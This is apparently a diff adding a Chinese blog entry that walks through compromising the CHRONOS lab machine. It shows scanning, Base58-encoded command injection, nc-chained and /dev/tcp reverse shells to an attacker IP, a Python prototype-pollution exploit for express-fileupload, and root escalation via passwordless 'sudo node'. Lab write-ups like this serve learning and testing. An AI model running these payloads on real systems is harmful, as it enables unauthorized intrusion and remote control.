@@ -8,6 +8,139 @@
 ]]></content>
   </entry>
   <entry>
+    <title>CHRONOS</title>
+    <url>/2022/10/29/CHRONOS/</url>
+    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 10.0.2.0/16  <span class="comment">#建议在实际子网掩码减8</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/01.png" class title="This is an example image">
+
+
+
+<p><strong>0x02 端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/02.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 服务识别</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/03.png" class title="This is an example image">
+
+
+
+<p><strong>0x04 Web页面探查</strong></p>
+<img src="/2022/10/29/CHRONOS/04.png" class title="This is an example image">
+
+<p>针对Web页面通常有两种思路：</p>
+<p>1、爆破路径</p>
+<p>此处爆破无果，不是403就是301，也许是自带的字典不够强大吧。</p>
+<p>2、查看源码</p>
+<p>右键查看网页源码，发现 js 脚本有点猫腻。</p>
+<img src="/2022/10/29/CHRONOS/06.png" class title="This is an example image">
+
+<p>此处80和8000端口的源码是一样的，猜想是 js 搞的鬼，这里js代码被混淆了用在线网站格式化查看</p>
+<p>推荐使用 cyberchef，效果如下</p>
+<img src="/2022/10/29/CHRONOS/07.png" class title="This is an example image">
+
+<p>可以看到 js 中有个地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>0x05 编码&amp;命令注入</strong></p>
+<p>抓个包看看：</p>
+<img src="/2022/10/29/CHRONOS/08.png" class title="This is an example image">
+
+<p>可以看到，页面发出了两个请求，其中一个域名解析失败，而目标机的8000端口是开放的，猜测此处的域名解析IP应该为目标机本机，那么就试试配置本地的hosts，让整个域名指向目标机。</p>
+<img src="/2022/10/29/CHRONOS/09.png" class title="This is an example image">
+
+<p>重新访问页面，请求加载成功</p>
+<img src="/2022/10/29/CHRONOS/10.png" class title="This is an example image">
+
+<p>单独抓取新访问请求查看参数和请求</p>
+<img src="/2022/10/29/CHRONOS/11.png" class title="This is an example image">
+
+<p>发现format参数疑似编码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<p>cyberchef 自动识别试试</p>
+<img src="/2022/10/29/CHRONOS/12.png" class title="This is an example image">
+
+<p>可以看到识别出编码为 Base58 ，解码内容为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>疑似 linux bash 命令 ，猜测后端应该执行编码指令</p>
+<p>尝试编码堆叠注入</p>
+<img src="/2022/10/29/CHRONOS/13.png" class title="This is an example image">
+
+<p>存在注入漏洞</p>
+<img src="/2022/10/29/CHRONOS/14.png" class title="This is an example image">
+
+
+
+<p><strong>0x06 反弹shell &amp; 信息收集</strong></p>
+<p>既然有命令注入直接尝试 nc 反弹，经尝试，靶机上的 nc 没有 -e 参数，用 nc 串联的方式反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | 10.0.2.4 5555</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/15.png" class title="This is an example image">
+
+<p>进行基础的信息收集</p>
+<img src="/2022/10/29/CHRONOS/16.png" class title="This is an example image">
+
+<p>当前为普通用户，服务端用node.js搭建</p>
+<img src="/2022/10/29/CHRONOS/17.png" class title="This is an example image">
+
+<p>查看 &#x2F;etc&#x2F;passwd 得到 imera 账号有 bash 权限</p>
+<img src="/2022/10/29/CHRONOS/18.png" class title="This is an example image">
+
+<p>home 目录下的 imera 目录有 user.txt文件，但只有其自身有权限</p>
+<p>所以现在的思路是提权，提权思路一般有</p>
+<ol>
+<li>内核提权，uname -a</li>
+<li>suid 权限配置不当，通过执行高权限用户文件得到高权限。</li>
+<li>sudo 提权</li>
+</ol>
+<p>暂时没找到可以利用的，默认命令执行的目录为 &#x2F;opt&#x2F;chronos，看到同级目录下还有个 chronos-v2 目录</p>
+<p>又是一个 node.js 服务端，那就找找 node.js 框架漏洞吧</p>
+<p>网上找到了node.js的代码注入漏洞，原理是参数污染，利用条件为开启了express-fileupload，并且 parseNested 选项为 true</p>
+<img src="/2022/10/29/CHRONOS/19.png" class title="This is an example image">
+
+<p>发现刚好满足条件</p>
+<p>根据靶机条件修改端口和IP信息</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.4/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开启 http 服务，把文件上传到靶机，执行反弹 shell</p>
+<img src="/2022/10/29/CHRONOS/20.png" class title="This is an example image">
+
+<p>看到反弹了 imera 权限，读取 &#x2F;home&#x2F;imera  的user.txt，这就是个 flag，base64加密，没啥内容。</p>
+<img src="/2022/10/29/CHRONOS/21.png" class title="This is an example image">
+
+
+
+<p>尝试能否提权到 root</p>
+<p>查看拥有 sudo 权限的程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/22.png" class title="This is an example image">
+
+<p>可以看到执行 sudo node 无需密码，那思路是用 node 创建一个子进程</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/29/CHRONOS/23.png" class title="This is an example image">
+
+<p>有 root 权限后在对应目录下找到了另外的flag。</p>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BOREDHACKERBLOG: CLOUD AV</title>
     <url>/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/</url>
     <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
